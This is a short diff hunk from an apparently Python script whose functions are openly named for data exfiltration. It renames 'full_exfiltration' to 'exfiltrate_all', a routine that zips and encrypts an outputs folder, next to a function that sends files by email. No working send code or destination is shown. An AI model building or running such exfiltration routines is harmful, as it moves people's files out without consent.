@@ -103,7 +103,7 @@ def exfiltrate_via_email(file_path):
     except Exception as e:
         print(f"❌ Erreur Email : {e}")
 
-def full_exfiltration():
+def exfiltrate_all():
     """Exfiltration complète du dossier outputs"""
     enc_file = zip_and_encrypt(OUTPUTS)
     if enc_file:
